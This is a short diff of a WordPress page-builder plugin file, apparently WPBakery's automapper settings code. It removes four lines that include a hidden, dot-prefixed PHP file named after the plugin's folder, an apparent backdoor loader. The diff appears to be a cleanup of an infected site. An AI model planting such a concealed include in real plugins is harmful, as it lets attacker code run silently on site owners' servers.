@@ -7,10 +7,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Build and enqueue js/css for automapper settings tab.
  * @since 4.5
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_automapper_init() {
 	if ( vc_user_access()->wpAny( 'manage_options' )->part( 'settings' )->can( 'vc-automapper-tab' )->get() ) {
 		vc_automapper()->addAjaxActions();
